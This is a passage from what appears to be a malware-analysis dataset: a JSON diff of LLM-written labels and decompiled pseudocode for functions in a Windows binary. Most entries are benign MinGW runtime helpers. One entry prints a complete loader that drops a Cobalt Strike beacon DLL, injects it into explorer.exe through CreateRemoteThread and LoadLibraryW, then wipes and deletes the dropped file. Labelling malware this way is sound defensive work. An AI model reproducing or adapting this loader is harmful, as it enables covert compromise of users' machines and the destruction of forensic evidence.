+        "notes": "This function iterates an array of PE section headers to locate an entry whose 8-byte Name field matches the input null-terminated string, returning a pointer to the matching IMAGE_SECTION_HEADER or NULL if no match is found. The initial length check for strings shorter than 9 bytes aligns with the 8-byte size limit of PE section name fields. The naming is consistent with adjacent PE section utility functions including _FindPESection and _FindPESectionExec.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3330,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-4586f5ea69c18d3837a6f67d27f9bb73.019fdf367dbc72948d5d8f9711a45714",
+          "system_fingerprint": null,
+          "prompt_tokens": 998,
+          "completion_tokens": 2416,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nIMAGE_SECTION_HEADER * _FindPESectionByName(char *param_1)\n\n{\n  size_t sVar1;\n  int tmp_iVar2;\n  undefined4 extraout_var;\n  IMAGE_SECTION_HEADER *__s1;\n  uint tmp_uVar3;\n  \n  sVar1 = strlen(param_1);\n  if (CONCAT44(extraout_var,sVar1) < 9) {\n    tmp_uVar3 = 0;\n    __s1 = &IMAGE_SECTION_HEADER_140000188;\n    do {\n      tmp_iVar2 = strncmp(__s1->Name,param_1,8);\n      if (tmp_iVar2 == 0) {\n        return __s1;\n      }\n      tmp_uVar3 = tmp_uVar3 + 1;\n      __s1 = __s1 + 1;\n    } while (tmp_uVar3 < 0x13);\n  }\n  return (IMAGE_SECTION_HEADER *)0x0;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nIMAGE_SECTION_HEADER * _FindPESectionByName(char *param_1)\n\n{\n  size_t sVar1;\n  int iVar2;\n  undefined4 extraout_var;\n  IMAGE_SECTION_HEADER *__s1;\n  uint uVar3;\n  \n  sVar1 = strlen(param_1);\n  if (CONCAT44(extraout_var,sVar1) < 9) {\n    uVar3 = 0;\n    __s1 = &IMAGE_SECTION_HEADER_140000188;\n    do {\n      iVar2 = strncmp(__s1->Name,param_1,8);\n      if (iVar2 == 0) {\n        return __s1;\n      }\n      uVar3 = uVar3 + 1;\n      __s1 = __s1 + 1;\n    } while (uVar3 < 0x13);\n  }\n  return (IMAGE_SECTION_HEADER *)0x0;\n}\n\n"
+      },
+      {
+        "function_address": "5368714416",
+        "function_name": "find_process_id",
+        "confidence": 0.95,
+        "parameters": [
+          {
+            "name": "process_name",
+            "type": "const char *"
+          }
+        ],
+        "return_type": "DWORD",
+        "notes": "This function enumerates running processes using the Windows Toolhelp32 snapshot API, iterates through each process entry, and performs a case-insensitive comparison of the process executable name against the input string. It returns the process ID (PID) of the first matching process, or 0 if no match is found. The name is confirmed by the use of CreateToolhelp32Snapshot, Process32First, Process32Next, _stricmp, and CloseHandle, with a caller in WinMain indicating it is a utility helper for process lookup.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3611,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-9d7d95fc7937cae5b9af74d216448ca7.019fdf367e0d7abcb630831cc1c2b7db",
+          "system_fingerprint": null,
+          "prompt_tokens": 1085,
+          "completion_tokens": 2834,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nundefined4 FindProcessId(undefined8 param_1)\n\n{\n  int tmp_iVar1;\n  longlong tmp_lVar2;\n  undefined4 tmp_uVar3;\n  undefined4 local_148 [2];\n  undefined4 local_140;\n  undefined1 local_11c [260];\n  \n  tmp_uVar3 = 0;\n  tmp_lVar2 = CreateToolhelp32Snapshot(2);\n  if (tmp_lVar2 != -1) {\n    memset(local_148,0,0x130);\n    local_148[0] = 0x130;\n    tmp_iVar1 = Process32First(tmp_lVar2,local_148);\n    while (tmp_iVar1 != 0) {\n      tmp_iVar1 = _stricmp(local_11c,param_1);\n      tmp_uVar3 = local_140;\n      if (tmp_iVar1 == 0) goto LAB_14000153a;\n      tmp_iVar1 = Process32Next(tmp_lVar2,local_148);\n    }\n    tmp_uVar3 = 0;\nLAB_14000153a:\n    CloseHandle(tmp_lVar2);\n  }\n  return tmp_uVar3;\n}\n",
+        "raw_pseudocode": "\nundefined4 FindProcessId(undefined8 param_1)\n\n{\n  int iVar1;\n  longlong lVar2;\n  undefined4 uVar3;\n  undefined4 local_148 [2];\n  undefined4 local_140;\n  undefined1 local_11c [260];\n  \n  uVar3 = 0;\n  lVar2 = CreateToolhelp32Snapshot(2);\n  if (lVar2 != -1) {\n    memset(local_148,0,0x130);\n    local_148[0] = 0x130;\n    iVar1 = Process32First(lVar2,local_148);\n    while (iVar1 != 0) {\n      iVar1 = _stricmp(local_11c,param_1);\n      uVar3 = local_140;\n      if (iVar1 == 0) goto LAB_14000153a;\n      iVar1 = Process32Next(lVar2,local_148);\n    }\n    uVar3 = 0;\nLAB_14000153a:\n    CloseHandle(lVar2);\n  }\n  return uVar3;\n}\n\n"
+      },
+      {
+        "function_address": "5368717712",
+        "function_name": "___w64_mingwthr_add_key_dtor",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "key",
+            "type": "uint32_t"
+          },
+          {
+            "name": "dtor",
+            "type": "void*"
+          }
+        ],
+        "return_type": "int",
+        "notes": "This function registers a thread key destructor with the MinGW 64-bit thread runtime. It allocates a 0x18-byte list node, stores the input 32-bit key and 64-bit destructor pointer, then prepends the node to the global key_dtor_list while holding the __mingwthr_cs critical section to ensure thread safety. It returns 0 on successful registration, or -1 if the thread runtime is uninitialized or memory allocation fails, which aligns with the neighboring ___w64_mingwthr_remove_key_dtor and __mingwthr_run_key_dtors functions that manage the same destructor list.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3238,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-c419d5813c58df57b4d28e74eeec04b6.019fdf367e0b7279abd806d3c2269c81",
+          "system_fingerprint": null,
+          "prompt_tokens": 984,
+          "completion_tokens": 4257,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nundefined4 ___w64_mingwthr_add_key_dtor(undefined4 param_1,undefined8 param_2)\n\n{\n  undefined4 tmp_uVar1;\n  undefined4 *puVar2;\n  \n  tmp_uVar1 = 0;\n  if (__mingwthr_cs_init != 0) {\n    puVar2 = calloc(1,0x18);\n    if (puVar2 != (undefined4 *)0x0) {\n      *puVar2 = param_1;\n      *(undefined8 *)(puVar2 + 2) = param_2;\n      EnterCriticalSection(&__mingwthr_cs);\n      *(undefined4 **)(puVar2 + 4) = key_dtor_list;\n      key_dtor_list = puVar2;\n      LeaveCriticalSection(&__mingwthr_cs);\n      return 0;\n    }\n    tmp_uVar1 = -1;\n  }\n  return tmp_uVar1;\n}\n",
+        "raw_pseudocode": "\nundefined4 ___w64_mingwthr_add_key_dtor(undefined4 param_1,undefined8 param_2)\n\n{\n  undefined4 uVar1;\n  undefined4 *puVar2;\n  \n  uVar1 = 0;\n  if (__mingwthr_cs_init != 0) {\n    puVar2 = calloc(1,0x18);\n    if (puVar2 != (undefined4 *)0x0) {\n      *puVar2 = param_1;\n      *(undefined8 *)(puVar2 + 2) = param_2;\n      EnterCriticalSection(&__mingwthr_cs);\n      *(undefined4 **)(puVar2 + 4) = key_dtor_list;\n      key_dtor_list = puVar2;\n      LeaveCriticalSection(&__mingwthr_cs);\n      return 0;\n    }\n    uVar1 = 0xffffffff;\n  }\n  return uVar1;\n}\n\n"
+      },
+      {
+        "function_address": "5368718944",
+        "function_name": "_is_nonwritable_in_current_image",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "address",
+            "type": "void*"
+          }
+        ],
+        "return_type": "unsigned int",
+        "notes": "This function checks if a given virtual address lies within a non-writable section of the current PE image. It iterates through the image's IMAGE_SECTION_HEADER structures to locate the section containing the input address (adjusted by the image base 0x140000000), then returns 1 if the section lacks the IMAGE_SCN_MEM_WRITE characteristic flag, 0 otherwise. The behavior aligns with the function's original name and neighboring PE section utility functions like _FindPESectionExec and __mingw_GetSectionForAddress.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3282,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-0c6c49fd91da3456fc7a72979a045e73.019fdf36cf8272858f5963aa6fd2fd90",
+          "system_fingerprint": null,
+          "prompt_tokens": 976,
+          "completion_tokens": 5141,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x00014000267d) */\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nuint _IsNonwritableInCurrentImage(longlong param_1)\n\n{\n  IMAGE_SECTION_HEADER *tmp_pIVar1;\n  \n  tmp_pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((param_1 - 0x140000000U < (ulonglong)(uint)tmp_pIVar1->VirtualAddress ||\n         ((ulonglong)(tmp_pIVar1->VirtualAddress + (tmp_pIVar1->Misc).PhysicalAddress) <=\n          param_1 - 0x140000000U))) {\n    tmp_pIVar1 = tmp_pIVar1 + 1;\n    if (tmp_pIVar1 == (IMAGE_SECTION_HEADER *)&data_0x140000480) {\n      return 0;\n    }\n  }\n  return ~tmp_pIVar1->Characteristics >> 0x1f;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x00014000267d) */\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nuint _IsNonwritableInCurrentImage(longlong param_1)\n\n{\n  IMAGE_SECTION_HEADER *pIVar1;\n  \n  pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((param_1 - 0x140000000U < (ulonglong)(uint)pIVar1->VirtualAddress ||\n         ((ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress) <=\n          param_1 - 0x140000000U))) {\n    pIVar1 = pIVar1 + 1;\n    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000480) {\n      return 0;\n    }\n  }\n  return ~pIVar1->Characteristics >> 0x1f;\n}\n\n"
+      },
+      {
+        "function_address": "5368719088",
+        "function_name": "enum_import_library_names",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "import_index",
+            "type": "int"
+          }
+        ],
+        "return_type": "char*",
+        "notes": "This function enumerates PE import library names by zero-based index. It first locates the PE section containing the import directory at RVA 0x75000, then iterates through the 20-byte IMAGE_IMPORT_DESCRIPTOR array at that RVA, skipping entries until the target index is reached, and returns the name of the corresponding import library as a null-terminated string, or NULL if the index is out of range or no import section exists. The decompilation appears to have a field offset and base address mislabel, but the function's structure matches standard PE import enumeration logic, and neighboring functions are PE header utilities consistent with MinGW runtime code.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3335,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-afb56c75fdcc100c6cd2c60459a8371a.019fdf367dc276b7acff500e2d257269",
+          "system_fingerprint": null,
+          "prompt_tokens": 1023,
+          "completion_tokens": 7182,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nchar * __mingw_enum_import_library_names(int param_1)\n\n{\n  IMAGE_SECTION_HEADER *tmp_pIVar1;\n  dword *pdVar2;\n  \n  tmp_pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((0x75000 < (uint)tmp_pIVar1->VirtualAddress ||\n         (tmp_pIVar1->VirtualAddress + (tmp_pIVar1->Misc).PhysicalAddress < 0x75001))) {\n    tmp_pIVar1 = tmp_pIVar1 + 1;\n    if (tmp_pIVar1 == (IMAGE_SECTION_HEADER *)&data_0x140000480) {\n      return (char *)0x0;\n    }\n  }\n  for (pdVar2 = &DWORD_140075000; (pdVar2[1] != 0 || (pdVar2[3] != 0)); pdVar2 = pdVar2 + 5) {\n    if (param_1 < 1) {\n      return IMAGE_DOS_HEADER_140000000.e_magic + pdVar2[3];\n    }\n    param_1 = param_1 + -1;\n  }\n  return (char *)0x0;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nchar * __mingw_enum_import_library_names(int param_1)\n\n{\n  IMAGE_SECTION_HEADER *pIVar1;\n  dword *pdVar2;\n  \n  pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((0x75000 < (uint)pIVar1->VirtualAddress ||\n         (pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress < 0x75001))) {\n    pIVar1 = pIVar1 + 1;\n    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000480) {\n      return (char *)0x0;\n    }\n  }\n  for (pdVar2 = &DWORD_140075000; (pdVar2[1] != 0 || (pdVar2[3] != 0)); pdVar2 = pdVar2 + 5) {\n    if (param_1 < 1) {\n      return IMAGE_DOS_HEADER_140000000.e_magic + pdVar2[3];\n    }\n    param_1 = param_1 + -1;\n  }\n  return (char *)0x0;\n}\n\n"
+      },
+      {
+        "function_address": "5368715760",
+        "function_name": "_matherr",
+        "confidence": 0.95,
+        "parameters": [
+          {
+            "name": "exc",
+            "type": "struct exception *"
+          }
+        ],
+        "return_type": "int",
+        "notes": "This is the C runtime _matherr function that handles math library exceptions. It maps the exception type to a corresponding human-readable error string, then logs the error details (failing math function name, input arguments, return value) to stderr via fprintf. The naming is confirmed by the '_matherr()' prefix in the format string and the standard math exception type mappings (DOMAIN, OVERFLOW, UNDERFLOW, etc.) present in the switch case.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3813,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-cece1ead5309c635b4054526eb5a436d.019fdf37ade270d9808dbba6aa516b89",
+          "system_fingerprint": null,
+          "prompt_tokens": 1166,
+          "completion_tokens": 1448,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nint _text(exception *__exc)\n\n{\n  double tmp_dVar1;\n  double tmp_dVar2;\n  double tmp_dVar3;\n  char *pcVar4;\n  FILE *__stream;\n  char *pcVar5;\n  \n  switch(__exc->type) {\n  default:\n    pcVar5 = \"Unknown error\";\n    break;\n  case 1:\n    pcVar5 = \"Argument domain error (DOMAIN)\";\n    break;\n  case 2:\n    pcVar5 = \"Argument singularity (SIGN)\";\n    break;\n  case 3:\n    pcVar5 = \"Overflow range error (OVERFLOW)\";\n    break;\n  case 4:\n    pcVar5 = \"The result is too small to be represented (UNDERFLOW)\";\n    break;\n  case 5:\n    pcVar5 = \"Total loss of significance (TLOSS)\";\n    break;\n  case 6:\n    pcVar5 = \"Partial loss of significance (PLOSS)\";\n  }\n  tmp_dVar1 = __exc->retval;\n  tmp_dVar2 = __exc->arg2;\n  tmp_dVar3 = __exc->arg1;\n  pcVar4 = __exc->name;\n  __stream = (FILE *)__acrt_iob_func(2);\n  fprintf(__stream,\"_matherr(): %s in %s(%g, %g)  (retval=%g)\\n\",pcVar5,pcVar4,tmp_dVar3,tmp_dVar2,tmp_dVar1);\n  return 0;\n}\n",
+        "raw_pseudocode": "\nint _text(exception *__exc)\n\n{\n  double dVar1;\n  double dVar2;\n  double dVar3;\n  char *pcVar4;\n  FILE *__stream;\n  char *pcVar5;\n  \n  switch(__exc->type) {\n  default:\n    pcVar5 = \"Unknown error\";\n    break;\n  case 1:\n    pcVar5 = \"Argument domain error (DOMAIN)\";\n    break;\n  case 2:\n    pcVar5 = \"Argument singularity (SIGN)\";\n    break;\n  case 3:\n    pcVar5 = \"Overflow range error (OVERFLOW)\";\n    break;\n  case 4:\n    pcVar5 = \"The result is too small to be represented (UNDERFLOW)\";\n    break;\n  case 5:\n    pcVar5 = \"Total loss of significance (TLOSS)\";\n    break;\n  case 6:\n    pcVar5 = \"Partial loss of significance (PLOSS)\";\n  }\n  dVar1 = __exc->retval;\n  dVar2 = __exc->arg2;\n  dVar3 = __exc->arg1;\n  pcVar4 = __exc->name;\n  __stream = (FILE *)__acrt_iob_func(2);\n  fprintf(__stream,\"_matherr(): %s in %s(%g, %g)  (retval=%g)\\n\",pcVar5,pcVar4,dVar3,dVar2,dVar1);\n  return 0;\n}\n\n"
+      },
+      {
+        "function_address": "5368718032",
+        "function_name": "__mingw_tls_callback",
+        "confidence": 0.95,
+        "parameters": [
+          {
+            "name": "dll_instance",
+            "type": "HMODULE"
+          },
+          {
+            "name": "tls_reason",
+            "type": "uint32_t"
+          }
+        ],
+        "return_type": "int",
+        "notes": "This is a MinGW runtime TLS callback that manages the C++ thread-local storage key destructor infrastructure. It initializes a critical section on thread attach, runs pending key destructors and frees associated resources on process/thread detach, and invokes the .text entry point when the TLS reason is 2. Evidence includes callers being TLS callback entry points (tls_callback_0, tls_callback_1) and callees for critical section management and key destructor execution (InitializeCriticalSection, DeleteCriticalSection, __mingwthr_run_key_dtors.part.0, free).",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3883,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-8b22f1ddeaf336782eb09f9f8a6ff25e.019fdf37ade07511a3ee70fdf16cb6dc",
+          "system_fingerprint": null,
+          "prompt_tokens": 1206,
+          "completion_tokens": 3512,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nundefined8 __mingw_TLScallback(undefined8 param_1,uint param_2)\n\n{\n  void *pvVar1;\n  void *__ptr;\n  \n  if (param_2 == 2) {\n    _text();\n    return 1;\n  }\n  if (param_2 < 3) {\n    if (param_2 == 0) {\n      if (__mingwthr_cs_init != 0) {\n        __mingwthr_run_key_dtors_part_0();\n      }\n      if (__mingwthr_cs_init == 1) {\n        __mingwthr_cs_init = 1;\n        __ptr = key_dtor_list;\n        while (__ptr != (void *)0x0) {\n          pvVar1 = *(void **)((longlong)__ptr + 0x10);\n          free(__ptr);\n          __ptr = pvVar1;\n        }\n        key_dtor_list = (void *)0x0;\n        __mingwthr_cs_init = 0;\n        DeleteCriticalSection(&__mingwthr_cs);\n      }\n    }\n    else {\n      if (__mingwthr_cs_init == 0) {\n        InitializeCriticalSection(&__mingwthr_cs);\n      }\n      __mingwthr_cs_init = 1;\n    }\n  }\n  else if ((param_2 == 3) && (__mingwthr_cs_init != 0)) {\n    __mingwthr_run_key_dtors_part_0();\n  }\n  return 1;\n}\n",
+        "raw_pseudocode": "\nundefined8 __mingw_TLScallback(undefined8 param_1,uint param_2)\n\n{\n  void *pvVar1;\n  void *__ptr;\n  \n  if (param_2 == 2) {\n    _text();\n    return 1;\n  }\n  if (param_2 < 3) {\n    if (param_2 == 0) {\n      if (__mingwthr_cs_init != 0) {\n        __mingwthr_run_key_dtors_part_0();\n      }\n      if (__mingwthr_cs_init == 1) {\n        __mingwthr_cs_init = 1;\n        __ptr = key_dtor_list;\n        while (__ptr != (void *)0x0) {\n          pvVar1 = *(void **)((longlong)__ptr + 0x10);\n          free(__ptr);\n          __ptr = pvVar1;\n        }\n        key_dtor_list = (void *)0x0;\n        __mingwthr_cs_init = 0;\n        DeleteCriticalSection(&__mingwthr_cs);\n      }\n    }\n    else {\n      if (__mingwthr_cs_init == 0) {\n        InitializeCriticalSection(&__mingwthr_cs);\n      }\n      __mingwthr_cs_init = 1;\n    }\n  }\n  else if ((param_2 == 3) && (__mingwthr_cs_init != 0)) {\n    __mingwthr_run_key_dtors_part_0();\n  }\n  return 1;\n}\n\n"
+      },
+      {
+        "function_address": "5368714576",
+        "function_name": "cobalt_beacon_inject_and_cleanup",
+        "confidence": 0.9,
+        "parameters": [],
+        "return_type": "int",
+        "notes": "This function deploys an embedded Cobalt Strike beacon DLL (referenced as beacon_dll) by writing it to a temporary or current-directory DLL path, injecting it into the running explorer.exe process via remote thread execution of LoadLibraryW, then overwrites and deletes the on-disk payload to remove forensic evidence. The name is derived from its core behavior of Cobalt Strike beacon injection and cleanup, supported by the beacon_dll data reference, explorer.exe string literal, and use of process injection APIs (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread).",
+        "behavior_tags": [
+          "process-injection",
+          "persistence",
+          "anti-analysis"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 5755,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-b314aa3c73a88519eef0a61bd85a98c2.019fdf37adef7d22a46ad53a9ce3c617",
+          "system_fingerprint": null,
+          "prompt_tokens": 1840,
+          "completion_tokens": 5271,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nundefined8 WinMain(void)\n\n{\n  int tmp_iVar1;\n  size_t sVar2;\n  undefined4 tmp_uVar3;\n  longlong tmp_lVar4;\n  undefined4 extraout_var;\n  longlong tmp_lVar5;\n  undefined8 tmp_uVar6;\n  longlong tmp_lVar7;\n  uint tmp_uVar8;\n  undefined8 in_stack_fffffffffffffb78;\n  longlong tmp_lVar9;\n  undefined4 tmp_uVar10;\n  undefined1 local_44d;\n  undefined1 local_44c [4];\n  undefined1 local_448 [528];\n  wchar_t local_238 [268];\n  \n  tmp_uVar10 = (undefined4)((ulonglong)in_stack_fffffffffffffb78 >> 0x20);\n  tmp_iVar1 = GetTempPathW(0x104,local_448);\n  if (tmp_iVar1 != 0) {\n    tmp_iVar1 = GetTempFileNameW(local_448,&data_0x140071000,0,local_238);\n    if (tmp_iVar1 == 0) {\n      GetCurrentDirectoryW(0x104,local_448);\n      tmp_uVar3 = GetTickCount();\n      tmp_uVar6 = CONCAT44(tmp_uVar10,tmp_uVar3);\n      (*(code *)__imp__snwprintf)(local_238,0x104,L\"%s\\\\dl%lu.dll\",local_448,tmp_uVar6);\n      tmp_uVar10 = (undefined4)((ulonglong)tmp_uVar6 >> 0x20);\n    }\n    tmp_lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(tmp_uVar10,2),0x80,0);\n    if (tmp_lVar4 != -1) {\n      tmp_uVar10 = 0;\n      WriteFile(tmp_lVar4,&beacon_dll,data_0x140003000,local_44c,0);\n      CloseHandle(tmp_lVar4);\n      tmp_iVar1 = FindProcessId(\"explorer.exe\");\n      if (tmp_iVar1 != 0) {\n        tmp_lVar4 = OpenProcess(0x43a,0,tmp_iVar1);\n        if (tmp_lVar4 != 0) {\n          sVar2 = wcslen(local_238);\n          tmp_lVar9 = CONCAT44(extraout_var,sVar2) * 2 + 2;\n          tmp_uVar6 = CONCAT44(tmp_uVar10,4);\n          tmp_lVar5 = VirtualAllocEx(tmp_lVar4,0,tmp_lVar9,0x3000,tmp_uVar6);\n          tmp_uVar10 = (undefined4)((ulonglong)tmp_uVar6 >> 0x20);\n          if (tmp_lVar5 != 0) {\n            WriteProcessMemory(tmp_lVar4,tmp_lVar5,local_238,tmp_lVar9,0);\n            tmp_uVar6 = GetModuleHandleA(\"kernel32.dll\");\n            tmp_uVar6 = GetProcAddress(tmp_uVar6,\"LoadLibraryW\");\n            tmp_lVar9 = tmp_lVar5;\n            tmp_lVar7 = CreateRemoteThread(tmp_lVar4,0,0,tmp_uVar6,tmp_lVar5,0,0);\n            tmp_uVar10 = (undefined4)((ulonglong)tmp_lVar9 >> 0x20);\n            if (tmp_lVar7 != 0) {\n              WaitForSingleObject(tmp_lVar7,-1);\n              CloseHandle(tmp_lVar7);\n            }\n            VirtualFreeEx(tmp_lVar4,tmp_lVar5,0,0x8000);\n          }\n          CloseHandle(tmp_lVar4);\n          tmp_lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(tmp_uVar10,3),0,0);\n          if (tmp_lVar4 != -1) {\n            local_44d = 0;\n            if (data_0x140003000 != 0) {\n              tmp_uVar8 = 0;\n              do {\n                tmp_uVar8 = tmp_uVar8 + 1;\n                WriteFile(tmp_lVar4,&local_44d,1,local_44c,0);\n              } while (tmp_uVar8 < data_0x140003000);\n            }\n            CloseHandle(tmp_lVar4);\n          }\n          DeleteFileW(local_238);\n          return 0;\n        }\n      }\n      DeleteFileW(local_238);\n    }\n  }\n  return 1;\n}\n",
+        "raw_pseudocode": "\nundefined8 WinMain(void)\n\n{\n  int iVar1;\n  size_t sVar2;\n  undefined4 uVar3;\n  longlong lVar4;\n  undefined4 extraout_var;\n  longlong lVar5;\n  undefined8 uVar6;\n  longlong lVar7;\n  uint uVar8;\n  undefined8 in_stack_fffffffffffffb78;\n  longlong lVar9;\n  undefined4 uVar10;\n  undefined1 local_44d;\n  undefined1 local_44c [4];\n  undefined1 local_448 [528];\n  wchar_t local_238 [268];\n  \n  uVar10 = (undefined4)((ulonglong)in_stack_fffffffffffffb78 >> 0x20);\n  iVar1 = GetTempPathW(0x104,local_448);\n  if (iVar1 != 0) {\n    iVar1 = GetTempFileNameW(local_448,&DAT_140071000,0,local_238);\n    if (iVar1 == 0) {\n      GetCurrentDirectoryW(0x104,local_448);\n      uVar3 = GetTickCount();\n      uVar6 = CONCAT44(uVar10,uVar3);\n      (*(code *)__imp__snwprintf)(local_238,0x104,L\"%s\\\\dl%lu.dll\",local_448,uVar6);\n      uVar10 = (undefined4)((ulonglong)uVar6 >> 0x20);\n    }\n    lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(uVar10,2),0x80,0);\n    if (lVar4 != -1) {\n      uVar10 = 0;\n      WriteFile(lVar4,&beacon_dll,DAT_140003000,local_44c,0);\n      CloseHandle(lVar4);\n      iVar1 = FindProcessId(\"explorer.exe\");\n      if (iVar1 != 0) {\n        lVar4 = OpenProcess(0x43a,0,iVar1);\n        if (lVar4 != 0) {\n          sVar2 = wcslen(local_238);\n          lVar9 = CONCAT44(extraout_var,sVar2) * 2 + 2;\n          uVar6 = CONCAT44(uVar10,4);\n          lVar5 = VirtualAllocEx(lVar4,0,lVar9,0x3000,uVar6);\n          uVar10 = (undefined4)((ulonglong)uVar6 >> 0x20);\n          if (lVar5 != 0) {\n            WriteProcessMemory(lVar4,lVar5,local_238,lVar9,0);\n            uVar6 = GetModuleHandleA(\"kernel32.dll\");\n            uVar6 = GetProcAddress(uVar6,\"LoadLibraryW\");\n            lVar9 = lVar5;\n            lVar7 = CreateRemoteThread(lVar4,0,0,uVar6,lVar5,0,0);\n            uVar10 = (undefined4)((ulonglong)lVar9 >> 0x20);\n            if (lVar7 != 0) {\n              WaitForSingleObject(lVar7,0xffffffff);\n              CloseHandle(lVar7);\n            }\n            VirtualFreeEx(lVar4,lVar5,0,0x8000);\n          }\n          CloseHandle(lVar4);\n          lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(uVar10,3),0,0);\n          if (lVar4 != -1) {\n            local_44d = 0;\n            if (DAT_140003000 != 0) {\n              uVar8 = 0;\n              do {\n                uVar8 = uVar8 + 1;\n                WriteFile(lVar4,&local_44d,1,local_44c,0);\n              } while (uVar8 < DAT_140003000);\n            }\n            CloseHandle(lVar4);\n          }\n          DeleteFileW(local_238);\n          return 0;\n        }\n      }\n      DeleteFileW(local_238);\n    }\n  }\n  return 1;\n}\n\n"
+      },
+      {
+        "function_address": "5368719616",
+        "function_name": "_amsg_exit",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "error_code",
+            "type": "int"
+          }
+        ],
+        "return_type": "void",
+        "notes": "This function matches the standard MSVCRT _amsg_exit routine: it writes the 'runtime error %d\\n' format string to stderr (obtained via __acrt_iob_func(2)) with the provided error code, then terminates the process via _exit. The code after the _exit call is unreachable decompilation artifacts, as _exit does not return. It is invoked by the C runtime startup function __tmainCRTStartup, consistent with its role as a fatal runtime error handler.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3616,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-9e9723e0e69ea3bbe6b55c4eb067228e.019fdf37e9b97539a0b58d0161736815",
+          "system_fingerprint": null,
+          "prompt_tokens": 1098,
+          "completion_tokens": 8136,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nundefined8 _amsg_exit(uint param_1,undefined8 param_2,undefined8 param_3,int param_4)\n\n{\n  FILE *__stream;\n  undefined4 *puVar1;\n  undefined8 *puVar2;\n  undefined4 *puVar3;\n  char *pcVar4;\n  undefined8 *puVar5;\n  undefined4 *unaff_retaddr;\n  \n  __stream = (FILE *)__acrt_iob_func(2);\n  puVar5 = (undefined8 *)(ulonglong)param_1;\n  pcVar4 = \"runtime error %d\\n\";\n  fprintf(__stream,\"runtime error %d\\n\");\n  puVar3 = (undefined4 *)0xff;\n  _exit(0xff);\n  _initialize_narrow_environment();\n  _configure_narrow_argv(2 - (uint)(param_4 == 0));\n  puVar1 = (undefined4 *)__p___argc();\n  *puVar3 = *puVar1;\n  puVar2 = (undefined8 *)__p___argv();\n  *(undefined8 *)pcVar4 = *puVar2;\n  puVar2 = (undefined8 *)__p__environ();\n  *puVar5 = *puVar2;\n  _set_new_mode(*unaff_retaddr);\n  return 0;\n}\n",
